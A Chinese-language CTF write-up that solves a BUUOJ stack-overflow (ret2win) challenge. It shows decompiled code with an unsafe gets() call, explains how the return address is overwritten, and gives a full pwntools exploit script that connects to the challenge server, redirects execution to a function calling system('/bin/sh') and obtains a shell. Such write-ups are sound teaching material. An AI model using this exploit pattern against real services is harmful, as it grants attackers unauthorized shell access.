
# rip 栈溢出题型

本题需要工具：wsl(Ubuntu22.04)，ida,pwntools

在做此题目之前，请先了解栈这种数据结构

---

## 前期分析

打开靶机，用ida加载含漏洞的文件

checksec看看保护 并得到是64位

pwn题目是通过攻破远程服务的漏洞来获取权限，故不需要像re一样查询string
比起重视flag，我们更应该关注函数本身，

观察左侧窗口 发现有*system类函数，点进去跟踪发现函数system跳转到fun函数
继续跟踪发现
fun：：

### 关键函数

```c
int fun()
{
  return system("/bin/sh");
}
```

有关键函数调用

所以怎么执行到这里的代码就是我们所想要的了

好我们回头看主函数

### 主函数

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rsp+1h] [rbp-Fh] BYREF

  puts("please input");
  gets(s, argv);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
```

char s[15]只容纳字节 但是gets是危险函数！

这意味着我们可以利用返回地址跳转执行fun函数

---

## 栈溢出原理

栈溢出原理：

一个程序是通过栈去决定调用顺序的

正常时候

高地址

### 正常栈结构

```text
+------------------+
|   调用者栈帧      |
+------------------+ <-- ebp (调用者的)
|   返回地址        |  ← 函数返回后执行的位置
+------------------+ <-- ebp (当前函数)
|   保存的 ebp      |
+------------------+
|   局部变量        |
|   (缓冲区)        |
+------------------+ <-- esp
```

我们的目标是

### 覆盖返回地址目标

```text
+------------------+
|   调用者栈帧      |
+------------------+
|   返回地址        |  ← 目标：覆盖这里
+------------------+ <-- 旧的 ebp
|   保存的 ebp      |  ← 也可能需要覆盖
+------------------+
|   char[15]        |
|   ...             |
|   char[0]         |  ← 输入从这里开始
+------------------+ <-- esp
```

也就是我们的输入一步步覆盖地址，利用返回地址的跳转性执行我们想要的代码

把文件附件拉到我们的wsl下，作者是存./下了

---

## payload 编写

接下来写payload

### payload 脚本

```python
from pwn import *

r = remote("node5.buuoj.cn",29241)

elf=ELF("./pwn1")

f_addr=elf.symbols['fun']

len=15+8

payload= b'A'*len + p64(f_addr+1)

r.sendline(payload)

r.interactive()
```

详细解读payload

### 详细解读payload

- r = remote("node5.buuoj.cn",29241)，远程连接服务器使用它的服务

- elf=ELF("./pwn1") 解析本地文件

- f_addr=elf.symbols['fun']找到他的地址

- len为什么是15+8？

  15来源于char的15

  8指的是64位下 rbp的大小（rbp是用于局部变量的定位的，本题是用不上的），既然是一个定位符，我们不需要啊，也覆盖掉

- 15+8结束了过后，就是函数的返回地址了，程序在局部函数执行完会去跳转到这个地址，那我们构造恶意的地址供他跳转也就是fun的地址

于是payload

```python
payload= b'A'*len + p64(f_addr+1)
```

关于这个b A p64 +1的解释

### 关于这个b A p64 +1的解释

- b: 把后面的东西换成字节如把A换成/x41放入char中（不换也行，垃圾数据来的，但是py不能拼接）所以转成字节

- b'A'*len就是填充，p64就是将一个字符串整数转成64位的地址

---

## 交互与收尾

最后发送，打开

r.interactive()交互模式

这是我们已获得了权限

ls查询

发现flag

cat 结束


